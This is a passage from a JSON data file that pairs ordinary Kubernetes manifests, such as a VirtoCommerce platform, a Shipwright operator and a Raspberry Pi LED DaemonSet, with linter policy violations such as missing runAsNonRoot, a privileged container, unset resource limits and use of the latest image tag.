    "violation_text": "container \"node-container\" has cpu request 0"
  },
  {
    "id": "10512",
    "manifest_path": "data/manifests/the_stack_sample/sample_4067.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: node-pod\nspec:\n  containers:\n  - name: node-container\n    image: node\n    ports:\n    - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"node-container\" has memory limit 0"
  },
  {
    "id": "10513",
    "manifest_path": "data/manifests/the_stack_sample/sample_4068.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: platform\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: platform\n  template:\n    metadata:\n      annotations:\n        reloader.stakater.com/search: 'true'\n        configmap.reloader.stakater.com/reload: platform-cm,modules-cm,platform-secret-configmap\n        vault.hashicorp.com/agent-inject: 'true'\n        vault.hashicorp.com/agent-pre-populate-only: 'true'\n        vault.hashicorp.com/agent-configmap: $(VC_INSTANCE)-platform-secret-configmap\n      labels:\n        app: platform\n    spec:\n      containers:\n      - name: vc-platform-web\n        image: docker.pkg.github.com/virtocommerce/vc-platform/platform:dev-linux-latest\n        envFrom:\n        - configMapRef:\n            name: platform-cm\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - source /vault/secrets/config_base && source /vault/secrets/config_custom\n          && dotnet VirtoCommerce.Platform.Web.dll\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /opt/virtocommerce/platform/wwwroot/cms-content\n          name: cms-content-data\n        - mountPath: /opt/virtocommerce/platform/modules\n          name: modules-data\n      volumes:\n      - name: cms-content-data\n        persistentVolumeClaim:\n          claimName: cms-content-volume\n      - name: modules-data\n        persistentVolumeClaim:\n          claimName: modules-volume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"vc-platform-web\" does not have a read-only root file system"
  },
  {
    "id": "10514",
    "manifest_path": "data/manifests/the_stack_sample/sample_4068.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: platform\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: platform\n  template:\n    metadata:\n      annotations:\n        reloader.stakater.com/search: 'true'\n        configmap.reloader.stakater.com/reload: platform-cm,modules-cm,platform-secret-configmap\n        vault.hashicorp.com/agent-inject: 'true'\n        vault.hashicorp.com/agent-pre-populate-only: 'true'\n        vault.hashicorp.com/agent-configmap: $(VC_INSTANCE)-platform-secret-configmap\n      labels:\n        app: platform\n    spec:\n      containers:\n      - name: vc-platform-web\n        image: docker.pkg.github.com/virtocommerce/vc-platform/platform:dev-linux-latest\n        envFrom:\n        - configMapRef:\n            name: platform-cm\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - source /vault/secrets/config_base && source /vault/secrets/config_custom\n          && dotnet VirtoCommerce.Platform.Web.dll\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /opt/virtocommerce/platform/wwwroot/cms-content\n          name: cms-content-data\n        - mountPath: /opt/virtocommerce/platform/modules\n          name: modules-data\n      volumes:\n      - name: cms-content-data\n        persistentVolumeClaim:\n          claimName: cms-content-volume\n      - name: modules-data\n        persistentVolumeClaim:\n          claimName: modules-volume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"vc-platform-web\" is not set to runAsNonRoot"
  },
  {
    "id": "10515",
    "manifest_path": "data/manifests/the_stack_sample/sample_4068.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: platform\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: platform\n  template:\n    metadata:\n      annotations:\n        reloader.stakater.com/search: 'true'\n        configmap.reloader.stakater.com/reload: platform-cm,modules-cm,platform-secret-configmap\n        vault.hashicorp.com/agent-inject: 'true'\n        vault.hashicorp.com/agent-pre-populate-only: 'true'\n        vault.hashicorp.com/agent-configmap: $(VC_INSTANCE)-platform-secret-configmap\n      labels:\n        app: platform\n    spec:\n      containers:\n      - name: vc-platform-web\n        image: docker.pkg.github.com/virtocommerce/vc-platform/platform:dev-linux-latest\n        envFrom:\n        - configMapRef:\n            name: platform-cm\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - source /vault/secrets/config_base && source /vault/secrets/config_custom\n          && dotnet VirtoCommerce.Platform.Web.dll\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /opt/virtocommerce/platform/wwwroot/cms-content\n          name: cms-content-data\n        - mountPath: /opt/virtocommerce/platform/modules\n          name: modules-data\n      volumes:\n      - name: cms-content-data\n        persistentVolumeClaim:\n          claimName: cms-content-volume\n      - name: modules-data\n        persistentVolumeClaim:\n          claimName: modules-volume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"vc-platform-web\" has cpu request 0"
  },
  {
    "id": "10516",
    "manifest_path": "data/manifests/the_stack_sample/sample_4068.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: platform\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: platform\n  template:\n    metadata:\n      annotations:\n        reloader.stakater.com/search: 'true'\n        configmap.reloader.stakater.com/reload: platform-cm,modules-cm,platform-secret-configmap\n        vault.hashicorp.com/agent-inject: 'true'\n        vault.hashicorp.com/agent-pre-populate-only: 'true'\n        vault.hashicorp.com/agent-configmap: $(VC_INSTANCE)-platform-secret-configmap\n      labels:\n        app: platform\n    spec:\n      containers:\n      - name: vc-platform-web\n        image: docker.pkg.github.com/virtocommerce/vc-platform/platform:dev-linux-latest\n        envFrom:\n        - configMapRef:\n            name: platform-cm\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - source /vault/secrets/config_base && source /vault/secrets/config_custom\n          && dotnet VirtoCommerce.Platform.Web.dll\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /opt/virtocommerce/platform/wwwroot/cms-content\n          name: cms-content-data\n        - mountPath: /opt/virtocommerce/platform/modules\n          name: modules-data\n      volumes:\n      - name: cms-content-data\n        persistentVolumeClaim:\n          claimName: cms-content-volume\n      - name: modules-data\n        persistentVolumeClaim:\n          claimName: modules-volume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"vc-platform-web\" has memory limit 0"
  },
  {
    "id": "10517",
    "manifest_path": "data/manifests/the_stack_sample/sample_4070.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: default-http-backend\n  namespace: nginx-ingress\nspec:\n  selector:\n    matchLabels:\n      app: default-http-backend\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: default-http-backend\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"default-http-backend\" does not have a read-only root file system"
  },
  {
    "id": "10518",
    "manifest_path": "data/manifests/the_stack_sample/sample_4070.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: default-http-backend\n  namespace: nginx-ingress\nspec:\n  selector:\n    matchLabels:\n      app: default-http-backend\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: default-http-backend\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"default-http-backend\" is not set to runAsNonRoot"
  },
  {
    "id": "10519",
    "manifest_path": "data/manifests/the_stack_sample/sample_4071.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: build-operator\n  namespace: build-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: build-operator\n  template:\n    metadata:\n      labels:\n        name: build-operator\n    spec:\n      serviceAccountName: build-operator\n      containers:\n      - name: build-operator\n        image: quay.io/shipwright/shipwright-operator:latest\n        command:\n        - build-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: BUILD_OPERATOR_LEADER_ELECTION_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: build-operator\n        livenessProbe:\n          exec:\n            command:\n            - stat\n            - /tmp/operator-sdk-ready\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - stat\n            - /tmp/operator-sdk-ready\n          initialDelaySeconds: 5\n          periodSeconds: 10\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"build-operator\" is using an invalid container image, \"quay.io/shipwright/shipwright-operator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10520",
    "manifest_path": "data/manifests/the_stack_sample/sample_4071.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: build-operator\n  namespace: build-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: build-operator\n  template:\n    metadata:\n      labels:\n        name: build-operator\n    spec:\n      serviceAccountName: build-operator\n      containers:\n      - name: build-operator\n        image: quay.io/shipwright/shipwright-operator:latest\n        command:\n        - build-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: BUILD_OPERATOR_LEADER_ELECTION_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: build-operator\n        livenessProbe:\n          exec:\n            command:\n            - stat\n            - /tmp/operator-sdk-ready\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - stat\n            - /tmp/operator-sdk-ready\n          initialDelaySeconds: 5\n          periodSeconds: 10\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"build-operator\" does not have a read-only root file system"
  },
  {
    "id": "10521",
    "manifest_path": "data/manifests/the_stack_sample/sample_4071.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: build-operator\n  namespace: build-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: build-operator\n  template:\n    metadata:\n      labels:\n        name: build-operator\n    spec:\n      serviceAccountName: build-operator\n      containers:\n      - name: build-operator\n        image: quay.io/shipwright/shipwright-operator:latest\n        command:\n        - build-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: BUILD_OPERATOR_LEADER_ELECTION_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: build-operator\n        livenessProbe:\n          exec:\n            command:\n            - stat\n            - /tmp/operator-sdk-ready\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - stat\n            - /tmp/operator-sdk-ready\n          initialDelaySeconds: 5\n          periodSeconds: 10\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"build-operator\" not found"
  },
  {
    "id": "10522",
    "manifest_path": "data/manifests/the_stack_sample/sample_4071.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: build-operator\n  namespace: build-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: build-operator\n  template:\n    metadata:\n      labels:\n        name: build-operator\n    spec:\n      serviceAccountName: build-operator\n      containers:\n      - name: build-operator\n        image: quay.io/shipwright/shipwright-operator:latest\n        command:\n        - build-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: BUILD_OPERATOR_LEADER_ELECTION_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: build-operator\n        livenessProbe:\n          exec:\n            command:\n            - stat\n            - /tmp/operator-sdk-ready\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - stat\n            - /tmp/operator-sdk-ready\n          initialDelaySeconds: 5\n          periodSeconds: 10\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"build-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "10523",
    "manifest_path": "data/manifests/the_stack_sample/sample_4071.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: build-operator\n  namespace: build-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: build-operator\n  template:\n    metadata:\n      labels:\n        name: build-operator\n    spec:\n      serviceAccountName: build-operator\n      containers:\n      - name: build-operator\n        image: quay.io/shipwright/shipwright-operator:latest\n        command:\n        - build-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: BUILD_OPERATOR_LEADER_ELECTION_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: build-operator\n        livenessProbe:\n          exec:\n            command:\n            - stat\n            - /tmp/operator-sdk-ready\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - stat\n            - /tmp/operator-sdk-ready\n          initialDelaySeconds: 5\n          periodSeconds: 10\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"build-operator\" has cpu request 0"
  },
  {
    "id": "10524",
    "manifest_path": "data/manifests/the_stack_sample/sample_4071.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: build-operator\n  namespace: build-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: build-operator\n  template:\n    metadata:\n      labels:\n        name: build-operator\n    spec:\n      serviceAccountName: build-operator\n      containers:\n      - name: build-operator\n        image: quay.io/shipwright/shipwright-operator:latest\n        command:\n        - build-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: BUILD_OPERATOR_LEADER_ELECTION_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: build-operator\n        livenessProbe:\n          exec:\n            command:\n            - stat\n            - /tmp/operator-sdk-ready\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - stat\n            - /tmp/operator-sdk-ready\n          initialDelaySeconds: 5\n          periodSeconds: 10\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"build-operator\" has memory limit 0"
  },
  {
    "id": "10525",
    "manifest_path": "data/manifests/the_stack_sample/sample_4074.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ic-sample-ui\n  name: ic-sample-ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ic-sample-ui\n  template:\n    metadata:\n      labels:\n        app: ic-sample-ui\n    spec:\n      containers:\n      - image: image-registry.openshift-image-registry.svc:5000/ic-pipelines/ic-sample-ui:latest\n        imagePullPolicy: Always\n        name: ic-sample-ui\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        env:\n        - name: IC_SAMPLE_API_SERVICE_HOST\n          value: ic-sample-api\n        - name: IC_SAMPLE_API_SERVICE_PORT\n          value: '8501'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ic-sample-ui\" is using an invalid container image, \"image-registry.openshift-image-registry.svc:5000/ic-pipelines/ic-sample-ui:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10526",
    "manifest_path": "data/manifests/the_stack_sample/sample_4074.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ic-sample-ui\n  name: ic-sample-ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ic-sample-ui\n  template:\n    metadata:\n      labels:\n        app: ic-sample-ui\n    spec:\n      containers:\n      - image: image-registry.openshift-image-registry.svc:5000/ic-pipelines/ic-sample-ui:latest\n        imagePullPolicy: Always\n        name: ic-sample-ui\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        env:\n        - name: IC_SAMPLE_API_SERVICE_HOST\n          value: ic-sample-api\n        - name: IC_SAMPLE_API_SERVICE_PORT\n          value: '8501'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ic-sample-ui\" does not have a read-only root file system"
  },
  {
    "id": "10527",
    "manifest_path": "data/manifests/the_stack_sample/sample_4074.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ic-sample-ui\n  name: ic-sample-ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ic-sample-ui\n  template:\n    metadata:\n      labels:\n        app: ic-sample-ui\n    spec:\n      containers:\n      - image: image-registry.openshift-image-registry.svc:5000/ic-pipelines/ic-sample-ui:latest\n        imagePullPolicy: Always\n        name: ic-sample-ui\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        env:\n        - name: IC_SAMPLE_API_SERVICE_HOST\n          value: ic-sample-api\n        - name: IC_SAMPLE_API_SERVICE_PORT\n          value: '8501'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ic-sample-ui\" is not set to runAsNonRoot"
  },
  {
    "id": "10528",
    "manifest_path": "data/manifests/the_stack_sample/sample_4074.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ic-sample-ui\n  name: ic-sample-ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ic-sample-ui\n  template:\n    metadata:\n      labels:\n        app: ic-sample-ui\n    spec:\n      containers:\n      - image: image-registry.openshift-image-registry.svc:5000/ic-pipelines/ic-sample-ui:latest\n        imagePullPolicy: Always\n        name: ic-sample-ui\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        env:\n        - name: IC_SAMPLE_API_SERVICE_HOST\n          value: ic-sample-api\n        - name: IC_SAMPLE_API_SERVICE_PORT\n          value: '8501'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ic-sample-ui\" has cpu request 0"
  },
  {
    "id": "10529",
    "manifest_path": "data/manifests/the_stack_sample/sample_4074.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ic-sample-ui\n  name: ic-sample-ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ic-sample-ui\n  template:\n    metadata:\n      labels:\n        app: ic-sample-ui\n    spec:\n      containers:\n      - image: image-registry.openshift-image-registry.svc:5000/ic-pipelines/ic-sample-ui:latest\n        imagePullPolicy: Always\n        name: ic-sample-ui\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        env:\n        - name: IC_SAMPLE_API_SERVICE_HOST\n          value: ic-sample-api\n        - name: IC_SAMPLE_API_SERVICE_PORT\n          value: '8501'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ic-sample-ui\" has memory limit 0"
  },
  {
    "id": "10530",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ledctl\" does not have a read-only root file system"
  },
  {
    "id": "10531",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pod-status\" does not have a read-only root file system"
  },
  {
    "id": "10532",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "10533",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"ledctl\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "10534",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"ledctl\" is privileged"
  },
  {
    "id": "10535",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ledctl\" is not set to runAsNonRoot"
  },
  {
    "id": "10536",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pod-status\" is not set to runAsNonRoot"
  },
  {
    "id": "10537",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "10538",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ledctl\" has cpu request 0"
  },
  {
    "id": "10539",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pod-status\" has cpu request 0"
  },
  {
    "id": "10540",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
